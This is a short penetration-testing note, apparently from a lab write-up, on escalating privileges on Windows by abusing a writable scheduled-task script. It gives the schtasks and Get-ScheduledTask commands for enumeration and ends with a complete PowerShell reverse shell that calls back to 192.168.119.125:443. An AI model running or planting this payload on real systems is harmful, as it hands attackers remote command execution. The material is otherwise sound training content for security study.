# ⏲ Scheduled Apps (CronJobs)

<details>

<summary>Examples of Scheduled Apps Exploitation</summary>

[https://app.gitbook.com/s/C01qT6YExS9JZIncykrV/privilege-escalation](https://app.gitbook.com/s/C01qT6YExS9JZIncykrV/privilege-escalation) (Slort PG)

</details>



Windows can be configured to run tasks at specific times, periodically (e.g. every 5 mins) or when triggered by some event (e.g. a user logon). Tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users, including SYSTEM. 98 Commands Unfortunately, there is no easy method for enumerating custom tasks that belong to other users as a low privileged user account. List all scheduled tasks your user can see:

```
schtasks /query /fo LIST /v
PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft Task,Name,Task,Path,State
```

Often we have to rely on other clues, such as finding a script or log file that indicates a scheduled task is being run.

Another example,

![](<../../../.gitbook/assets/image (3).png>)

There was a log.txt file that said that there was this scheduled task running every 5 minutes. Morever I had write access to these.

I renamed the backup_powershell.ps1 to backup_\_powershell.bak

Then I replaced that script with this powershell reverse shell.

Upon restart, I didnt need to wait 5 minutes since I had the permission to shutdown the computer using shutdown -r or Computer-Restart in Powershell.

```
# Nikhil SamratAshok Mittal: http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html

$client = New-Object System.Net.Sockets.TCPClient("192.168.119.125",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Afterwards, I was able to get a reverse shell.&#x20;
